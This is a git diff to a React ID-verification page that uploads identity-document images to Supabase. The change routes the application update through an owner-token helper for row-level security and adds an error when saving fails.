@@ -9,6 +9,7 @@ import { ChatButton } from "@/components/ChatButton";
 import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
 import { getApplicationStatus } from "@/lib/applicationPublic";
+import { ensureOwnerToken, updateApplicationPublic } from "@/lib/ownerToken";
 import { usePresence } from "@/hooks/usePresence";
 
 interface AppData {
@@ -117,6 +118,9 @@ const IDVerification = () => {
       const timestamp = Date.now();
       const appId = applicationId || "unknown";
 
+      // Ensure the x-owner-token header is present for storage + RPC RLS.
+      ensureOwnerToken();
+
       const [frontUrl, backUrl] = await Promise.all([
         uploadToStorage(frontImage, `${appId}/front_${timestamp}.${frontImage.name.split(".").pop()}`),
         uploadToStorage(backImage, `${appId}/back_${timestamp}.${backImage.name.split(".").pop()}`),
@@ -124,15 +128,15 @@ const IDVerification = () => {
 
       // تحديث قاعدة البيانات
       if (applicationId) {
-        await supabase
-          .from("customer_applications")
-          .update({
-            id_front_url: frontUrl,
-            id_back_url: backUrl,
-            id_verification_step: "submitted",
-            current_step: "id_verification",
-          })
-          .eq("id", applicationId);
+        const ok = await updateApplicationPublic(applicationId, {
+          id_front_url: frontUrl,
+          id_back_url: backUrl,
+          id_verification_step: "submitted",
+          current_step: "id_verification",
+        });
+        if (!ok) {
+          throw new Error("تعذر حفظ بيانات التحقق");
+        }
 
         // إرسال إشعار تيليجرام
         try {
